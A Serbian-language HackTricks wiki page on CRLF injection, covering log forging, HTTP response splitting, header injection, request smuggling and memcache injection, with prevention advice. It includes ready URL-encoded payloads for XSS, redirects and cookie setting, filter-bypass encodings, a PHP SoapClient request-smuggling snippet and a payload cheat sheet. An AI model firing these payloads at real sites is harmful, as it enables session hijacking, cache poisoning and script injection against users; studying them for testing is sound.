# CRLF (%0D%0A) Ubacivanje

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, kako pisano tako i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

### CRLF

Carriage Return (CR) i Line Feed (LF), zajedno poznati kao CRLF, su posebni karakteri koji se koriste u HTTP protokolu da označe kraj linije ili početak nove. Veb serveri i pregledači koriste CRLF da razlikuju između HTTP zaglavlja i tela odgovora. Ovi karakteri se univerzalno koriste u HTTP/1.1 komunikaciji između različitih vrsta veb servera, kao što su Apache i Microsoft IIS.

### Vulnerabilnost CRLF Injection

CRLF injection uključuje umetanje CR i LF karaktera u korisnički unos. Ova akcija dovodi server, aplikaciju ili korisnika u zabludu da interpretira umetnuti niz kao kraj jednog odgovora i početak drugog. Iako ovi karakteri nisu inherentno štetni, njihova zloupotreba može dovesti do HTTP response splitting-a i drugih zlonamernih aktivnosti.

### Primer: CRLF Injection u log fajlu

[Primer sa ovde](https://www.invicti.com/blog/web-security/crlf-http-header/)

Razmotrimo log fajl u admin panelu koji prati format: `IP - Vreme - Poseta putanje`. Tipičan unos bi mogao izgledati ovako:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Napadač može iskoristiti CRLF ubrizgavanje kako bi manipulisao ovim zapisom. Ubacivanjem CRLF karaktera u HTTP zahtev, napadač može izmeniti izlazni tok i falsifikovati unose u logu. Na primer, ubačeni niz može transformisati unos u logu u:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Evo, `%0d` i `%0a` predstavljaju URL-kodirane oblike CR i LF. Nakon napada, zapisnik bi pogrešno prikazao:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Napadač tako prikriva svoje zlonamerne aktivnosti tako što čini da izgleda kao da je lokalni host (entitet koji se obično smatra pouzdanim unutar serverskog okruženja) izvršio radnje. Server tumači deo upita koji počinje sa `%0d%0a` kao jedan parametar, dok se parametar `restrictedaction` parsira kao još jedan, odvojeni unos. Manipulisani upit efektivno imitira legitimnu administratorsku komandu: `/index.php?page=home&restrictedaction=edit`


### HTTP Response Splitting

#### Opis

HTTP Response Splitting je sigurnosna ranjivost koja se javlja kada napadač iskorišćava strukturu HTTP odgovora. Ova struktura razdvaja zaglavlja od tela koristeći specifičan niz karaktera, Carriage Return (CR) praćen Line Feed (LF), zajedno nazvani CRLF. Ako napadač uspe da ubaci sekvencu CRLF u zaglavlje odgovora, može efektivno manipulisati sadržajem sledećeg odgovora. Ova vrsta manipulacije može dovesti do ozbiljnih sigurnosnih problema, posebno Cross-site Scripting (XSS).

#### XSS putem HTTP Response Splitting-a

1. Aplikacija postavlja prilagođeno zaglavlje na sledeći način: `X-Custom-Header: UserInput`
2. Aplikacija preuzima vrednost za `UserInput` iz upita parametra, recimo "user_input". U scenarijima koji nemaju odgovarajuću validaciju i enkodiranje unosa, napadač može kreirati payload koji uključuje sekvencu CRLF, praćenu zlonamernim sadržajem.
3. Napadač kreira URL sa posebno kreiranim 'user_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- U ovom URL-u, `%0d%0a%0d%0a` je URL-enkodirani oblik CRLFCRLF. On vara server da ubaci sekvencu CRLF, čime server tretira sledeći deo kao telo odgovora.
4. Server reflektuje unos napadača u zaglavlje odgovora, što dovodi do neželjene strukture odgovora gde zlonamerni skript bude tumačen od strane pregledača kao deo tela odgovora.

#### Primer HTTP Response Splitting-a koji dovodi do preusmeravanja

Sa [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Preglednik na:
```
/%0d%0aLocation:%20http://myweb.com
```
I server odgovara sa zaglavljem:
```
Location: http://myweb.com
```
**Drugi primer: (sa** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### U URL putanji

Možete poslati payload **unutar URL putanje** da biste kontrolisali **odgovor** od servera (primer sa [ovde](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Pogledajte više primera u:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Ubacivanje HTTP zaglavlja

Ubacivanje HTTP zaglavlja, često iskorišćeno putem ubacivanja CRLF (Carriage Return and Line Feed), omogućava napadačima da ubace HTTP zaglavlja. Ovo može narušiti mehanizme bezbednosti kao što su XSS (Cross-Site Scripting) filteri ili SOP (Same-Origin Policy), što potencijalno može dovesti do neovlašćenog pristupa osetljivim podacima, kao što su CSRF tokeni, ili manipulacije korisničkim sesijama putem ubacivanja kolačića.

#### Iskorišćavanje CORS putem ubacivanja HTTP zaglavlja

Napadač može ubaciti HTTP zaglavlja kako bi omogućio CORS (Cross-Origin Resource Sharing), zaobilazeći ograničenja nametnuta SOP-om. Ovo kršenje omogućava skriptama sa zlonamernih izvora da komuniciraju sa resursima sa drugog izvora, potencijalno pristupajući zaštićenim podacima.

#### SSRF i ubacivanje HTTP zahteva putem CRLF

CRLF ubacivanje se može koristiti za kreiranje i ubacivanje potpuno novog HTTP zahteva. Značajan primer ove ranjivosti je ranjivost u PHP-ovoj klasi `SoapClient`, tačnije u parametru `user_agent`. Manipulacijom ovog parametra, napadač može ubaciti dodatna zaglavlja i sadržaj tela, ili čak ubaciti potpuno novi HTTP zahtev. U nastavku je prikazan PHP primer koji demonstrira ovu eksploataciju:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Ubacivanje zaglavlja za zahtevanje krijumčarenja

Za više informacija o ovoj tehnici i potencijalnim problemima [**proverite originalni izvor**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Možete ubaciti osnovna zaglavlja kako biste osigurali da **backend održava otvorenu vezu** nakon što odgovori na početni zahtev:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Nakon toga, može se specificirati drugi zahtev. Ovaj scenario obično uključuje [HTTP request smuggling](http-request-smuggling/), tehniku u kojoj dodatni zaglavlja ili elementi tela koje dodaje server nakon ubrizgavanja mogu dovesti do različitih sigurnosnih eksploata.

**Eksploatacija:**

1. **Zlonamerno ubrizgavanje prefiksa**: Ova metoda uključuje trovanje zahteva sledećeg korisnika ili keša veb stranice navođenjem zlonamernog prefiksa. Primer ovoga je:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Kreiranje prefiksa za trovanje reda odgovora**: Ovaj pristup uključuje kreiranje prefiksa koji, kada se kombinuje sa nepotrebnim podacima na kraju, formira potpuni drugi zahtev. Ovo može pokrenuti trovanje reda odgovora. Primer je:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache ubrizgavanje

Memcache je **key-value skladište koje koristi protokol u čistom tekstu**. Više informacija na:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Za potpune informacije pročitajte**[ **originalni članak**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Ako platforma preuzima **podatke iz HTTP zahteva i koristi ih bez sanitizacije** za izvršavanje **zahteva** ka **memcache** serveru, napadač može iskoristiti ovu funkcionalnost da **ubrizga nove memcache komande**.

Na primer, u otkrivenom propustu, ključevi keša su korišćeni za vraćanje IP adrese i porta kojem bi korisnik trebao da se poveže, a napadači su mogli **ubrizgati memcache komande** koje bi **trovali** keš kako bi poslali detalje žrtava (uključujući korisnička imena i lozinke) na servere napadača:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&h=178&auto=format&fit=crop"><figcaption></figcaption></figure>

Osim toga, istraživači su takođe otkrili da mogu desinhronizovati odgovore memcache-a kako bi slali IP adrese i portove napadača korisnicima čiji e-mail napadač nije znao:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&h=506&auto=format&fit=crop"><figcaption></figcaption></figure>

### Kako sprečiti CRLF / HTTP Header ubrizgavanje u veb aplikacijama

Da biste umanjili rizike od CRLF (Carriage Return and Line Feed) ili HTTP Header ubrizgavanja u veb aplikacijama, preporučuju se sledeće strategije:

1. **Izbegavajte direktni unos korisnika u zaglavlja odgovora:**
Najsigurniji pristup je da se suzdržite od uključivanja unosa korisnika direktno u zaglavlja odgovora.

2. **Kodiranje posebnih karaktera:**
Ako nije moguće izbeći direktni unos korisnika, obavezno koristite funkciju koja je namenjena kodiranju posebnih karaktera poput CR (Carriage Return) i LF (Line Feed). Ova praksa sprečava mogućnost CRLF ubrizgavanja.

3. **Ažurirajte programski jezik:**
Redovno ažurirajte programski jezik koji se koristi u vašim veb aplikacijama na najnoviju verziju. Odaberite verziju koja inherentno zabranjuje ubrizgavanje CR i LF karaktera unutar funkcija zaduženih za postavljanje HTTP zaglavlja.


### CHEAT LISTA

[Cheat lista odavde](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Automatski alati

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista za otkrivanje Brute-Force napada

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Reference
* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako ste zainteresovani za **hakersku karijeru** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, pisano i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
